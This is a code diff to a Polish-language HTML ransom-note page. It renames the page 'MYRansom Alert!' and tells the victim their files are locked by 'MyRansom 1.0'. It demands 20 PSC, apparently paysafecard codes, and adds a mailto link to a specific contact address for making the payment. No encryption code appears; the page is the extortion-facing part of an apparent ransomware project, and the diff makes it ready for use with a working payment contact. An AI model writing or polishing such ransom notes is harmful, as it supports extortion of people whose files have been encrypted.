@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Ransomware Alert</title>
+  <title>MYRansom Alert!</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@600&display=swap');
 
@@ -70,19 +70,20 @@
       line-height: 1.5;
     }
 
-    button.ransom-btn {
+    a.ransom-btn {
+      display: inline-block;
+      text-decoration: none;
       padding: 0.85rem 2.5rem;
       font-size: 1.125rem;
       font-weight: 600;
       color: var(--color-button-text);
       background-color: var(--color-button-bg);
-      border: none;
       border-radius: var(--border-radius);
       cursor: pointer;
       transition: background-color 0.3s ease, box-shadow 0.3s ease;
       box-shadow: 0 4px 8px rgba(17,24,39,0.15);
     }
-    button.ransom-btn:hover, button.ransom-btn:focus {
+    a.ransom-btn:hover, a.ransom-btn:focus {
       background-color: #374151;
       outline: none;
       box-shadow: 0 6px 12px rgba(55,65,81,0.3);
@@ -96,9 +97,8 @@
       <path d="M9 11V7a3 3 0 0 1 6 0v4"></path>
     </svg>
     <h1 id="title">Ups, Twoje pliki są zaszyfrowane</h1>
-    <p>Twoje dokumenty zostały zablokowane. Aby je odzyskać, musisz zapłacić okup.</p>
-    <button class="ransom-btn" type="button" aria-label="Zapłać okup">Zapłać okup</button>
+    <p>Twoje dokumenty zostały zablokowane Przez MyRansom 1.0. Aby je odzyskać, musisz zapłacić 20 PSC na podany adres email.</p>
+    <a href="mailto:myransomdecryptorpsc.wasabi153@passinbox.com?cc=decryptor" class="ransom-btn" role="button" aria-label="Zapłać okup">wyślij PSC</a>
   </main>
 </body>
 </html>
-
